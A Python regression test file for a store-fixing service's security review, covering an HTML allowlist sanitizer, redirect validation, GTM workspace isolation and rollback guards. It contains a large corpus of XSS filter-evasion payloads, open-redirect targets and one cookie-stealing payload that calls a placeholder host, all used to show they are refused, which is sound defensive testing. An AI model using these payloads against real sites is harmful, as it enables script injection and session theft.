"""AEGIS round 1 on f9e3a3f (BLOCKING, 3 Highs): one regression test per finding, each asserting the FIX (each fails on
f9e3a3f). The reviewer's probes asserted the defects; these are their inverses plus the corpus the round asked for."""

from __future__ import annotations

import pytest

from connectors.base import HttpAnswer, html
from connectors.richtext import is_safe
from connectors.shopify import OPS as SHOP_OPS
from errors import Unavailable
from helpers import (CLIENT_A, GOOGLE_SCOPES, PRODUCT, PRODUCT2, SHOP_A, FakeEngineers, Harness, rid, wired_ports)
from platforms import shopify_op


def _paid(h, conn, check, target):
    f = h.finding(conn, check=check, target=target)
    j = h.job([f])
    h.ok(h.accept(j))
    h.ok(h.pay(j))
    return j, h.item(j["job_id"])


def _plan(h, j, conn, item, ops):
    return h.plan(j, [{"item_id": item["item_id"], "connection_id": conn["connection_id"], "ops": ops}])


def _run(h, j, conn, item, ops):
    h.ok(_plan(h, j, conn, item, ops))
    h.ok(h.approve(j["job_id"]))
    return h.ok(h.apply(j["job_id"]))["items"][0]


# ======================================================================================= H1 rich text: allowlist

XSS = [
    # the round's bypasses
    '<svg/onload=alert(document.cookie)>', '<img src=x/onerror=alert(1)>', '<a href="jav&#x61;script:alert(1)">x</a>',
    '<a href="java&#09;script:alert(1)">x</a>', '<a href="java\nscript:alert(1)">x</a>',
    '<a href="&#106;avascript:alert(1)">x</a>', '<math><a xlink:href="jav&#97;script:alert(1)">x</a></math>',
    # OWASP XSS filter evasion cheat sheet (a representative cut)
    "<script>alert('XSS')</script>", '<SCRIPT SRC=//xss.test/.j></SCRIPT>', '<IMG SRC="javascript:alert(\'XSS\');">',
    '<IMG SRC=javascript:alert(\'XSS\')>', '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>', '<IMG SRC=`javascript:alert("x")`>',
    '<a onmouseover="alert(document.cookie)">x</a>', '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', '<img src=x onerror="&#0000106&#0000097">',
    '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74>',
    '<IMG SRC="jav\tascript:alert(\'XSS\');">', '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
    '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">', '<SCRIPT/XSS SRC="http://xss.test/xss.js"></SCRIPT>',
    '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>', '<<SCRIPT>alert("XSS");//\\<</SCRIPT>',
    '<IMG SRC="`<javascript:alert>`(\'XSS\')"', '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">', '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
    '<IMG DYNSRC="javascript:alert(\'XSS\')">', '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE>',
    '<svg><script>alert(1)</script></svg>', '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
    '<TABLE BACKGROUND="javascript:alert(\'XSS\')">', '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    '<p style="x:expression(alert(1))">x</p>', '<BASE HREF="javascript:alert(\'XSS\');//">',
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.test/scriptlet.html"></OBJECT>', '<EMBED SRC="data:image/svg+xml;base64,PHN2Zz4=">',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">', '<!--[if gte IE 4]><SCRIPT>alert(1)</SCRIPT><![endif]-->',
    '<p>ok</p><!-- comment -->', '<?xml version="1.0"?><p>x</p>', '<![CDATA[<script>alert(1)</script>]]>',
    '<form action=/x><button>go</button></form>', '<details open ontoggle=alert(1)>', '<video><source onerror=alert(1)>',
    '<a href="https://ok.test" target="_blank">x</a>', '<a href="//evil.test/">x</a>', '<a href="/\\evil.test">x</a>',
    '<a href="/%2fevil.test">x</a>', '<a href="/%5Cevil.test">x</a>', '<a href="http://insecure.test/">x</a>',
    '<a href="mailto:x@y.test">x</a>', '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
    '<img src="data:image/png;base64,iVBORw0KGgo=">', '<a href="vbscript:msgbox(1)">x</a>',
    '<a href=" javascript:alert(1)">x</a>', '<a href="&#x20;javascript:alert(1)">x</a>',
    '<a href="https://ok.test/&#x0A;">x</a>', '<a href="https://ok.test" href="javascript:alert(1)">x</a>',
    # mutation XSS (browser repair of misnesting / foreign content)
    '<p><a href="/a">x<a href="/b">y</a></a></p>', '<p><ul><li>x</li></ul></p>', '<ul>text<li>x</li></ul>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">', '<p>unclosed', '<p>a</b>', '</p>x',
    '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>', '<template><script>alert(1)</script></template>',
    '<P>upper</P>', '<p >spaced</p>', "<a href='/single'>x</a>", '<br/>', '<p>x<br />y</p>', '<img src=/x.png>',
]
SAFE = ['<p>Warm.</p>', '<p>Andre\'s "best" hoodie &amp; cap &lt;3</p>', '<h2>Care</h2><ul><li>Wash cold</li></ul>',
        '<p>See <a href="/products/blue-hoodie" title="Blue">the hoodie</a> or '
        '<a href="https://zbestmedia.com/size">sizes</a>.</p>',
        '<blockquote><p><em>Great</em> <strong>fit</strong></p></blockquote>',
        '<p><img src="https://cdn.shopify.com/s/a.png" alt="A" width="300" height="200"></p>', 'plain text only',
        '<ol><li>One</li><li>Two <b>bold</b><br>line</li></ol>', '<p><a href="#reviews">Reviews</a></p>']


@pytest.mark.parametrize("value", XSS)
def test_h1_xss_corpus_is_refused_by_the_allowlist(value):
    assert is_safe(value) is False
    assert html(65_535)(value) is False


@pytest.mark.parametrize("value", SAFE)
def test_h1_ordinary_rich_text_is_accepted_unchanged(value):
    assert is_safe(value) is True


def test_h1_a_bypass_never_passes_plan_validation(h):
    conn = h.connection()
    h.t.shop(SHOP_A).product(PRODUCT)
    j, it = _paid(h, conn, "product_content_error", PRODUCT)
    r = _plan(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "descriptionHtml",
                                "before": "<p>Warm.</p>",
                                "after": "<p>Warm.</p><svg/onload=fetch('//x.test/'+document.cookie)>"}])
    h.refused(r, 422, "OP_VALUE_INVALID")


def test_h1_a_store_whose_current_markup_is_outside_the_allowlist_can_still_be_fixed(h):
    conn = h.connection()
    h.t.shop(SHOP_A).product(PRODUCT, desc='<p style="color:red">Old</p>')
    j, it = _paid(h, conn, "product_content_error", PRODUCT)
    out = _run(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "descriptionHtml",
                                 "before": '<p style="color:red">Old</p>', "after": "<p>New</p>"}])
    assert out["status"] == "applied_verified"


# ======================================================================================= H2 partial-object loss

def test_h2_an_seo_title_fix_keeps_the_clients_seo_description(h):
    conn = h.connection()
    shop = h.t.shop(SHOP_A)
    shop.product(PRODUCT, seo_title=None, seo_desc="Client's hand-written SEO description")
    j, it = _paid(h, conn, "product_seo_missing", PRODUCT)
    out = _run(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "seo.title",
                                 "before": None, "after": "Blue Hoodie"}])
    assert out["status"] == "applied_verified"
    sent = [r.body["variables"]["product"] for _, r in h.t.writes()]
    assert sent == [{"id": PRODUCT, "seo": {"title": "Blue Hoodie",
                                           "description": "Client's hand-written SEO description"}}]
    assert shop.products[PRODUCT]["seo"]["description"] == "Client's hand-written SEO description"
    rows = [[PRODUCT, "seo.description", "Client's hand-written SEO description"]]
    assert out["result"]["snapshot"] == rows + [[PRODUCT, "seo.title", None]]          # both in the report
    assert out["result"]["readback"] == rows + [[PRODUCT, "seo.title", "Blue Hoodie"]]


def test_h2_the_untouched_seo_field_changing_under_us_fails_verification(h):
    conn = h.connection()
    shop = h.t.shop(SHOP_A)
    shop.product(PRODUCT, seo_desc="Kept")

    def meddle(conn_, req, real):
        ans = real()
        shop.products[PRODUCT]["seo"]["description"] = "Changed by someone"
        h.t.rules.clear()
        return ans
    h.t.rules.append((shopify_op("productUpdate"), meddle))
    j, it = _paid(h, conn, "product_seo_missing", PRODUCT)
    out = _run(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "seo.title",
                                 "before": None, "after": "T"}])
    assert out["result"]["failure"] == "verify_mismatch" and out["status"] == "rollback_failed"


def test_h2_audit_ga4_rollback_of_a_delete_restores_the_whole_key_event(h):
    from connectors.google_analytics import GA4Connector
    t = h.t
    t.ga4.props["properties/7"] = {"purchase": {"name": "properties/7/keyEvents/5", "eventName": "purchase",
                                                "deletable": True, "countingMethod": "ONCE_PER_EVENT",
                                                "defaultValue": {"numericValue": 25, "currencyCode": "USD"}}}
    c = GA4Connector()
    ctx: dict = {}
    key = ("properties/7", "key_event:purchase")
    c.read("properties/7", [key], ctx, t.ga4.handle)
    assert c.write("properties/7", key, None, ctx, t.ga4.handle)[0] == "applied"
    assert c.rollback("properties/7", [(key, {"countingMethod": "ONCE_PER_EVENT"}, None)], ctx, t.ga4.handle) \
        == "applied"
    assert t.ga4.props["properties/7"]["purchase"]["defaultValue"] == {"numericValue": 25, "currencyCode": "USD"}


# ======================================================================================= H3 GTM: dedicated workspace

def _gtm(h):
    gtm = h.t.gtm
    target = gtm.tag("11", paused=True)
    gtm.tag("12", paused=False, ttype="html")
    gtm.publish_initial()
    conn = h.connection(connector="gtm", account="accounts/1/containers/2", scopes=GOOGLE_SCOPES["gtm"])
    j, it = _paid(h, conn, "gtm_tag_paused", target)
    return gtm, conn, j, it, target


def _unpause(target):
    return [{"op": "gtm.tag.update", "target": target, "field": "paused", "before": True, "after": False}]


def test_h3_unapproved_workspace_edits_never_go_live_with_our_publish(h):
    gtm, conn, j, it, target = _gtm(h)
    gtm.tags["12"]["paused"] = True                          # the client's staff: unpublished, in THEIR workspace
    out = _run(h, j, conn, it, _unpause(target))
    assert out["status"] == "applied_verified"
    live = {t["tagId"]: t for t in gtm.versions[gtm.live]["tag"]}
    assert live["11"].get("paused", False) is False and live["12"].get("paused", False) is False
    assert gtm.tags["12"]["paused"] is True                   # their edit is still theirs, unpublished
    assert list(gtm.workspaces) == [gtm.default_ws]           # the run workspace is gone


def test_h3_an_unplanned_change_in_the_run_workspace_is_refused_and_the_workspace_deleted(h):
    gtm, conn, j, it, target = _gtm(h)

    def sneak(conn_, req, real):                              # something else lands in the run workspace
        ans = real()
        ws = max(gtm.workspaces)
        gtm.workspaces[ws]["tags"]["12"]["paused"] = True
        return ans
    h.t.rules.append((lambda c, r: r.method == "PUT", sneak))
    before = gtm.live
    out = _run(h, j, conn, it, _unpause(target))
    assert out["status"] == "rolled_back" and out["result"]["failure"] == "stage_refused"
    assert gtm.live == before and list(gtm.workspaces) == [gtm.default_ws]
    deletes = [r for _, r in h.t.writes() if r.method == "DELETE"]
    assert len(deletes) == 1
    sent = [e for e in h.ledger.events if e["event_type"] == "apply_request_sending"]
    anchored = h.ok(h.get("/audit/evidence", params={"event_type": "apply_request_sending", "limit": 1000},
                          caller="compliance_38"))
    assert len(sent) == anchored["committed"] and anchored["attempted"] == 0     # the DELETE is recorded, anchored


def test_h3_an_unpublished_version_ahead_of_live_refuses_before_any_write(h):
    gtm, conn, j, it, target = _gtm(h)
    gtm._version("someone's draft", gtm.tags)                 # latest != live
    out = _run(h, j, conn, it, _unpause(target))
    assert out["status"] == "dry_run_refused" and out["result"]["dry_run"]["mode"] == "base_not_live"
    assert not h.t.writes() and list(gtm.workspaces) == [gtm.default_ws]


def test_h3_the_lease_is_the_whole_container(h):
    gtm, conn, j, it, target = _gtm(h)
    j2, it2 = _paid(h, conn, "gtm_tag_trigger_wrong", "accounts/1/containers/2/tags/12")
    h.ok(_plan(h, j, conn, it, _unpause(target)))
    h.ok(h.approve(j["job_id"]))
    h.ok(_plan(h, j2, conn, it2, [{"op": "gtm.tag.update", "target": "accounts/1/containers/2/tags/12",
                                   "field": "firingTriggerId", "before": ["7"], "after": ["7", "8"]}]))
    h.ok(h.approve(j2["job_id"]))
    seen = {}

    def second(conn_, req):
        if req.is_write and "r" not in seen:
            seen["r"] = h.apply(j2["job_id"])
    h.t.before = second
    h.ok(h.apply(j["job_id"]))
    h.refused(seen["r"], 409, "RESOURCE_LEASED")
    assert h.ok(h.get("/leases"))[0]["resource_key"] == "gtm|accounts/1/containers/2|container"


# ======================================================================================= M1 change set bound to finding

def test_m1_ops_must_target_the_findings_resource_and_suit_its_check(h):
    conn = h.connection()
    shop = h.t.shop(SHOP_A)
    shop.product(PRODUCT)
    shop.product(PRODUCT2, desc="<p>Other product.</p>")
    j, it = _paid(h, conn, "product_seo_missing", PRODUCT)
    h.refused(_plan(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT2, "field": "seo.title",
                                      "before": None, "after": "x"}]), 422, "RESOURCE_MISMATCH")
    h.refused(_plan(h, j, conn, it, [{"op": "shopify.redirect.set", "target": "redirect:/sale", "field": "target",
                                      "before": None, "after": "/products/x"}]), 422, "RESOURCE_MISMATCH")
    h.refused(_plan(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "descriptionHtml",
                                      "before": "<p>Warm.</p>", "after": "<p>x</p>"}]), 422, "OP_NOT_FOR_CHECK")
    assert not h.t.calls


# ======================================================================================= M2 redirects

@pytest.mark.parametrize("target", ["/\\evil.example/login", "/%2fevil.example", "/%2Fevil", "/%5cevil", "/%5Cevil",
                                    "//evil.example", "https://evil.example/", "/a\\b", "/x%09y"])
def test_m2_redirect_targets_that_leave_the_store_are_refused(target):
    assert SHOP_OPS["shopify.redirect.set"].validator("target")(target) is False


def test_m2_self_redirects_and_plan_chains_and_loops_are_refused(h):
    conn = h.connection()
    j, it = _paid(h, conn, "broken_link", "redirect:/old")
    h.refused(_plan(h, j, conn, it, [{"op": "shopify.redirect.set", "target": "redirect:/old", "field": "target",
                                      "before": None, "after": "/old/"}]), 422, "OP_VALUE_INVALID")
    h.refused(_plan(h, j, conn, it, [{"op": "shopify.redirect.set", "target": "redirect:/%2fold", "field": "target",
                                      "before": None, "after": "/new"}]), 422)
    fa = h.finding(conn, check="broken_link", target="redirect:/a")
    fb = h.finding(conn, check="broken_link", target="redirect:/b")
    j2 = h.job([fa, fb])
    h.ok(h.accept(j2))
    h.ok(h.pay(j2))
    items = {i["finding_id"]: i["item_id"] for i in h.ok(h.get(f"/jobs/{j2['job_id']}"))["items"]}
    loop = [{"item_id": items[fa["finding_id"]], "connection_id": conn["connection_id"],
             "ops": [{"op": "shopify.redirect.set", "target": "redirect:/a", "field": "target", "before": None,
                      "after": "/b"}]},
            {"item_id": items[fb["finding_id"]], "connection_id": conn["connection_id"],
             "ops": [{"op": "shopify.redirect.set", "target": "redirect:/b", "field": "target", "before": None,
                      "after": "/a"}]}]
    h.refused(h.plan(j2, loop), 422, "REDIRECT_CHAIN")


def test_m2_a_chain_with_the_stores_existing_redirects_is_refused_before_any_write(h):
    conn = h.connection()
    shop = h.t.shop(SHOP_A)
    shop.redirects["gid://shopify/UrlRedirect/1"] = {"id": "gid://shopify/UrlRedirect/1", "path": "/new",
                                                      "target": "/old"}
    j, it = _paid(h, conn, "broken_link", "redirect:/old")
    out = _run(h, j, conn, it, [{"op": "shopify.redirect.set", "target": "redirect:/old", "field": "target",
                                 "before": None, "after": "/new"}])
    assert out["status"] == "dry_run_refused" and not h.t.writes()


# ======================================================================================= M3 GBP address

def test_m3_gbp_address_keeps_every_subfield_outside_the_allowlist(h):
    loc = "locations/555"
    h.t.gbp.location(loc, address={"regionCode": "US", "postalCode": "90001", "administrativeArea": "CA",
                                   "locality": "Los Angeles", "addressLines": ["1 Old St"],
                                   "sublocality": "Downtown", "recipients": ["Front desk"]})
    conn = h.connection(connector="gbp", account=loc, scopes=GOOGLE_SCOPES["gbp"])
    j, it = _paid(h, conn, "listing_address_wrong", loc)
    before = {"regionCode": "US", "postalCode": "90001", "administrativeArea": "CA", "locality": "Los Angeles",
              "addressLines": ["1 Old St"]}
    out = _run(h, j, conn, it, [{"op": "gbp.location.patch", "target": loc, "field": "storefrontAddress",
                                 "before": before, "after": {**before, "addressLines": ["2 New St"]}}])
    assert out["status"] == "applied_verified"
    addr = h.t.gbp.locations[loc]["storefrontAddress"]
    assert addr["sublocality"] == "Downtown" and addr["recipients"] == ["Front desk"]
    assert addr["addressLines"] == ["2 New St"]
    assert [loc, "storefrontAddress#unlisted", {"recipients": ["Front desk"], "sublocality": "Downtown"}] \
        in out["result"]["readback"]


# ======================================================================================= M4 per-client kill switch

def test_m4_a_failed_revocation_commit_still_stops_the_clients_other_connections(h):
    ca = h.connection()
    cb = h.connection(account="zbest-a2.myshopify.com")
    h.t.shop(SHOP_A).product(PRODUCT)
    h.t.shop("zbest-a2.myshopify.com").product(PRODUCT2)
    fa = h.finding(ca, target=PRODUCT)
    fb = h.finding(cb, target=PRODUCT2)
    j = h.job([fa, fb])
    h.ok(h.accept(j))
    h.ok(h.pay(j))
    plan = []
    for it in h.ok(h.get(f"/jobs/{j['job_id']}"))["items"]:
        c, prod = (ca, PRODUCT) if it["finding_id"] == fa["finding_id"] else (cb, PRODUCT2)
        plan.append({"item_id": it["item_id"], "connection_id": c["connection_id"],
                     "ops": [{"op": "shopify.product.update", "target": prod, "field": "seo.title", "before": None,
                              "after": "New"}]})
    h.ok(h.plan(j, plan))
    h.ok(h.approve(j["job_id"]))
    fired = {"done": False, "err": None}

    def before(conn, req):
        if not fired["done"]:
            fired["done"] = True
            h.ledger.fail = True
            try:
                h.svc.revoke_connection("hub", ca["connection_id"], {"request_id": rid(), "origin": "client"})
            except Unavailable as e:
                fired["err"] = e.reason
            h.ledger.fail = False
    h.t.before = before
    out = h.ok(h.apply(j["job_id"]))
    assert fired["err"] == "LEDGER_UNAVAILABLE"
    st = {i["resource"]["connection_id"]: i["status"] for i in out["items"]}
    assert st[cb["connection_id"]] != "applied_verified", st
    assert h.t.shop("zbest-a2.myshopify.com").products[PRODUCT2]["seo"]["title"] is None


# ======================================================================================= M5 guarded rollback

def test_m5_rollback_never_overwrites_a_concurrent_merchant_edit(h):
    conn = h.connection()
    shop = h.t.shop(SHOP_A)
    shop.product(PRODUCT, title="Old title")
    state = {"n": 0}

    def concurrent(conn_, req, real):                         # our write lands, the merchant edits, answer lost
        real()
        shop.products[PRODUCT]["title"] = "Merchant's new title"
        raise TimeoutError("lost")

    def once(c, r):
        if shopify_op("productUpdate")(c, r) and state["n"] == 0:
            state["n"] = 1
            return True
        return False
    h.t.rules.append((once, concurrent))
    j, it = _paid(h, conn, "product_content_error", PRODUCT)
    out = _run(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "title",
                                 "before": "Old title", "after": "Our title"}])
    assert out["status"] == "rollback_failed" and out["result"]["rollback"] == {"outcome": "conflict", "proven": False}
    assert shop.products[PRODUCT]["title"] == "Merchant's new title"
    assert h.ok(h.get("/frozen"))["resources"] and any(t["code"] == "ROLLBACK_FAILED" for t in h.ok(h.get("/tasks")))


# ======================================================================================= M6 proto3 defaults

def test_m6_a_gtm_answer_omitting_compilererror_means_false(h):
    gtm, conn, j, it, target = _gtm(h)

    def strip(conn_, req, platform):
        ans = platform()
        b = dict(ans.body)
        b.pop("compilerError", None)
        return HttpAnswer(ans.status, b)
    h.t.rules.append((lambda c, r: r.url.endswith(":quick_preview") or ":create_version" in r.url
                      or ":publish" in r.url, strip))
    assert _run(h, j, conn, it, _unpause(target))["status"] == "applied_verified"


# ======================================================================================= Lows

def test_low_frozen_mid_write_rolls_back_freezes_and_tells_andre(h):
    conn = h.connection()
    h.t.shop(SHOP_A).product(PRODUCT, title="T", desc="<p>D</p>")

    def freeze(conn_, req):
        if req.is_write and not h.svc.frozen_clients:
            h.ok(h.post("/clients/freeze", {"request_id": rid(), "client_id": CLIENT_A}, andre=True))
    h.t.before = freeze
    j, it = _paid(h, conn, "product_content_error", PRODUCT)
    out = _run(h, j, conn, it, [{"op": "shopify.product.update", "target": PRODUCT, "field": "title", "before": "T",
                                 "after": "T2"},
                                {"op": "shopify.product.update", "target": PRODUCT, "field": "descriptionHtml",
                                 "before": "<p>D</p>", "after": "<p>D2</p>"}])
    assert out["status"] == "halted_frozen" and out["result"]["rollback"]["proven"] is True
    assert h.t.shop(SHOP_A).products[PRODUCT]["title"] == "T"
    assert any(t["code"] == "FROZEN_MID_APPLY" for t in h.ok(h.get("/tasks")))


def test_low_a_payment_for_a_job_closed_unpaid_becomes_an_andre_refund(h):
    conn = h.connection()
    f = h.finding(conn)
    j = h.job([f])
    h.ok(h.accept(j))
    h.ok(h.post(f"/jobs/{j['job_id']}/cancel", {"request_id": rid()}, andre=True))
    ev = "fin-evt-" + "9" * 40
    out = h.ok(h.pay(j, ev=ev))
    assert out["orphan_payment"]["finance_event_id"] == ev
    r = h.ok(h.get("/refunds"))[0]
    assert r["amount"] == "150.00" and r["finance_event_id"] == ev and r["status"] == "proposed"
    assert any(t["code"] == "ORPHANED_PAYMENT" and t["status"] == "open" for t in h.ok(h.get("/tasks")))
    h.ok(h.post(f"/refunds/{r['refund_id']}/approve", {"request_id": rid(), "sha256": r["refund_sha256"]}, andre=True))
    assert not any(t["code"] == "ORPHANED_PAYMENT" and t["status"] == "open" for t in h.ok(h.get("/tasks")))
    h.ok(h.pay(j, ev=ev))                                     # the same event again: answered, nothing new


def test_low_the_brief_carries_the_stores_current_values_without_secrets(tmp_path):
    eng = FakeEngineers()
    h = Harness(tmp_path, ports=wired_ports(engineers=eng))
    conn = h.connection()
    h.t.shop(SHOP_A).product(PRODUCT, seo_title="Old SEO", seo_desc="sk-ant-" + "api03" * 5)
    j, it = _paid(h, conn, "product_seo_missing", PRODUCT)
    brief = h.ok(h.get(f"/jobs/{j['job_id']}/brief", caller="fire_team"))
    item = brief["items"][0]
    assert item["before"] == [[PRODUCT, "seo.title", "Old SEO"]]
    assert item["before_status"] == "read_some_withheld" and "sk-ant-" not in str(brief)
    assert not h.t.writes()
